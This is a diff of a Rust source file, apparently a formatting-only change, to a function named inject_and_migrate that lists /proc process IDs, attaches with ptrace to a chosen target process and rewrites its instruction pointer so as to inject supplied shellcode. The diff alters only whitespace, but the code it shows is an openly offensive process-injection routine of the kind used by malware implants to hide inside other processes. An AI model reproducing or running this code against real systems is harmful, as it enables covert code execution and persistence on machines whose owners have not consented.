@@ -1,4 +1,5 @@
 extern crate nix;
+
 use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
 use nix::sys::wait::{waitpid, WaitPidFlag};
 use nix::unistd::Pid;
@@ -8,14 +9,14 @@ use std::process::{self, Command};
 pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // List and collect all of the PIDs of active processes
     let list_pids = Command::new("ls")
-            .arg("/proc/")
-            .output()
-            .unwrap();
+        .arg("/proc/")
+        .output()
+        .unwrap();
     let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
-                                                        .unwrap()
-                                                        .split('\n')
-                                                        .flat_map(|s| s.parse().ok())
-                                                        .collect();
+        .unwrap()
+        .split('\n')
+        .flat_map(|s| s.parse().ok())
+        .collect();
 
     // Throw away anything under 100 to try to limit the chances you crash the machine
     pids.retain(|i| *i > 100 && *i != process::id() as i32);
@@ -28,10 +29,10 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
             .output()
             .unwrap()
             .stdout;
-            if String::from_utf8(commandline).unwrap().contains(target_process) && attach(Pid::from_raw(*pid)).is_ok() {
-                target_pid = *pid;
-                break;
-            };
+        if String::from_utf8(commandline).unwrap().contains(target_process) && attach(Pid::from_raw(*pid)).is_ok() {
+            target_pid = *pid;
+            break;
+        };
     }
     if target_pid == 0 {
         panic!("Could not find a {target_process} process whose memory can be manipulated");
@@ -52,7 +53,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Copy the RIP register to a mutable variable, then increment RIP by 2
     let mut point = registers.rip;
     registers.rip += 2;
-    
+
     // Write the updated RIP back to the target process
     if let Err(error) = setregs(target_pid, registers) {
         panic!("Unable to reset {target_process} registers: {error}");
